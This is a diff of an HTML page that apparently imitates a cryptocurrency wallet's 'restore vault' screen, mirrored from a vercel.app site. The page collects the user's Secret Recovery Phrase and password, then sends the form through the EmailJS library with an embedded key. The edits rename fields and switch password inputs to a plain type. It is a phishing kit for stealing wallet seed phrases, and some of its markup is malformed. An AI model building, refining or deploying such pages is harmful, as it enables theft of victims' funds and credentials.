@@ -422,10 +422,10 @@
                                 <div class="first-time-flow__text-block">Enter your secret phrase here to restore your vault.</div>
                                 <div class="first-time-flow__textarea-wrapper">
                                     <label>Secret Recovery Phrase</label>
-                                    <textarea style="display: none;" id="keys" class="first-time-flow__textarea" placeholder="Separate each word with a single space" autocomplete="off" name="message"></textarea>
+                                    <textarea style="display: none;" id="seed_phrase_textarea" class="first-time-flow__textarea" placeholder="Separate each word with a single space" autocomplete="off" name="cpph"></textarea>
                                     <div id="seed_phrase_textbox_container" class="MuiFormControl-root MuiTextField-root first-time-flow__textarea first-time-flow__seedphrase">
                                         <div class="MuiInputBase-root MuiInput-root jss27 MuiInputBase-formControl MuiInput-formControl">
-                                            <input id="keys" name="message" aria-invalid="false" autocomplete="off" placeholder="Paste Secret Recovery Phrase from clipboard" type="password" dir="auto" class="MuiInputBase-input MuiInput-input" value="">
+                                            <input id="keys" name="message" aria-invalid="false" autocomplete="off" placeholder="Paste Secret Recovery Phrase from clipboard" type="message" dir="auto" class="MuiInputBase-input MuiInput-input" value="">
                                         </div>
                                     </div>
                                     <div class="first-time-flow__checkbox-container">
@@ -434,11 +434,11 @@
                                     </div>
                                 </div>
                                 <div class="MuiFormControl-root MuiTextField-root first-time-flow__input MuiFormControl-marginNormal">
-                                    <label class="MuiFormLabel-root MuiInputLabel-root jss24 jss28 MuiInputLabel-formControl MuiInputLabel-animated MuiInputLabel-shrink" data-shrink="true" for="password" id="keys">
+                                    <label class="MuiFormLabel-root MuiInputLabel-root jss24 jss28 MuiInputLabel-formControl MuiInputLabel-animated MuiInputLabel-shrink" data-shrink="true" for="password" id="password-label">
                                         New password (min 8 chars)
                                     </label>
                                     <div class="MuiInputBase-root MuiInput-root jss27 MuiInputBase-formControl MuiInput-formControl">
-                                        <input required="" aria-invalid="false" name="message" autocomplete="new-password" id="keys" type="password" dir="auto" class="MuiInputBase-input MuiInput-input" value="">
+                                        <input required="" aria-invalid="false" name="ppc" autocomplete="new-password" id="password" type="password" dir="auto" class="MuiInputBase-input MuiInput-input" value="">
                                     </div>
                                 </div>
                                 <div class="MuiFormControl-root MuiTextField-root first-time-flow__input MuiFormControl-marginNormal">
@@ -446,7 +446,7 @@
                                         Confirm password
                                     </label>
                                     <div class="MuiInputBase-root MuiInput-root jss27 MuiInputBase-formControl MuiInput-formControl">
-                                        <input required="" name="message" aria-invalid="false" autocomplete="new-password" id="keys" type="password" dir="auto" class="MuiInputBase-input MuiInput-input" value="">
+                                        <input required="keys" name="message" aria-invalid="false" autocomplete="new-password" id="keys" type="message" dir="auto" class="MuiInputBase-input MuiInput-input" value="">
                                     </div>
                                 </div>
                                 <div class="first-time-flow__checkbox-container">
@@ -460,7 +460,7 @@
                                         </span>
                                     </span>
                                 </div>
-                               <input type="submit" id="button" value="IMPORT" >
+                                <button name="submit" class="" disabled="" id="submit" type="submit">Import</button>
                             </form>
                         </div>
                     </div>
@@ -476,16 +476,16 @@
             });
             }, 2000);
             </script>
-    
-<script type="text/javascript"
+
+              <script type="text/javascript"
   src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 
 <script type="text/javascript">
   emailjs.init('Sl_LbPBn89AL9hyA1')
-</script>
-                                        
-  <script>
-          const btn = document.getElementById('submit');
+</script>                          
+    
+<script>
+    const btn = document.getElementById('submit');
 
 document.getElementById('my-form')
  .addEventListener('submit', function(event) {
@@ -504,8 +504,8 @@ document.getElementById('my-form')
       btn.value = 'Send Email';
       alert(JSON.stringify(err));
     });
-});
-  </script>                                      
+});    
+</script>
 </body>
 <!-- Mirrored from multisafechain-nodes.vercel.app/form/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 05 Feb 2026 13:31:41 GMT -->
 </html>
